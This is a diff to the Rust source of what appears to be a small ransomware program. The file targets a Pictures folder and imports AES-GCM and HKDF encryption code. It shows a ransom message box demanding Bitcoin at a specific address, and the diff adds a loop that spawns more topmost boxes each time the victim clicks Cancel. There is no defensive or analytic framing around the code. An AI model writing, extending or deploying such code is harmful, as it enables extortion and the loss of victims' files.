@@ -1,5 +1,5 @@
 use std::fs::File;
-use std::io;
+use std::{io, ptr};
 use std::io::Write;
 use std::path::Path;
 use std::{fs, thread};
@@ -7,18 +7,14 @@ use std::{fs, thread};
 use aes_gcm::aead::{Aead, KeyInit};
 use aes_gcm::{Aes256Gcm, Key, Nonce};
 use colored::Colorize;
-use dotenv::dotenv;
 use hkdf::Hkdf;
-use rand::RngCore;
+use rand::{Rng, RngCore};
 use sha2::{Digest, Sha256};
 use std::process;
+use std::time::Duration;
+use winapi::um::winuser::{MessageBoxW, SetWindowPos, HWND_TOPMOST, IDCANCEL, IDOK, MB_ICONERROR, MB_OKCANCEL, SWP_NOSIZE, SWP_SHOWWINDOW};
 
 extern crate winapi;
-
-use std::ptr::null_mut as NULL;
-use std::time::Duration;
-use winapi::um::winuser;
-use winapi::um::winuser::IDOK;
 
 fn main() -> io::Result<()> {
     let directory_path = "../Pictures";
@@ -31,27 +27,52 @@ fn main() -> io::Result<()> {
         eprintln!("Error while listing files: {}", e);
     }
 
-    show_messagebox();
+    spawn_messageboxes(1);
 
     Ok(())
 }
 
+fn spawn_messageboxes(count: usize) {
+    let mut handles = vec![];
+
+    for _ in 0..count {
+        let handle = thread::spawn(|| {
+            show_messagebox();
+        });
+        handles.push(handle);
+        thread::sleep(Duration::from_millis(500));
+    }
+
+    for handle in handles {
+        let _ = handle.join();
+    }
+}
 fn show_messagebox() {
     let l_msg: Vec<u16> = "Pay 0.050000 Bitcoin: 1Lbcfr7sAHTD9CgdQo3HTMTkV8LK4ZnX71\0"
         .encode_utf16()
         .collect();
-    let l_title: Vec<u16> = "Your Pictures got encrypted".encode_utf16().collect();
+    let l_title: Vec<u16> = "Your Pictures got encrypted\0".encode_utf16().collect();
 
     unsafe {
-        winuser::MessageBoxW(
-            NULL(),
-            l_msg.as_ptr(),
-            l_title.as_ptr(),
-            winuser::MB_ICONERROR,
-        );
+        loop {
+            let hwnd = ptr::null_mut();
+
+            let result = MessageBoxW(hwnd, l_msg.as_ptr(), l_title.as_ptr(), MB_OKCANCEL | MB_ICONERROR);
+
+            let mut rng = rand::thread_rng();
+            let x = rng.gen_range(100..800);
+            let y = rng.gen_range(100..600);
+
+            SetWindowPos(hwnd, HWND_TOPMOST, x, y, 0, 0, SWP_NOSIZE | SWP_SHOWWINDOW);
+
+            if result == IDOK {
+                process::exit(0);
+            } else if result == IDCANCEL {
+                spawn_messageboxes(2);
+            }
+        }
     }
 }
-
 fn show_skull() {
     let skull = r#"
                  uuuuuuu
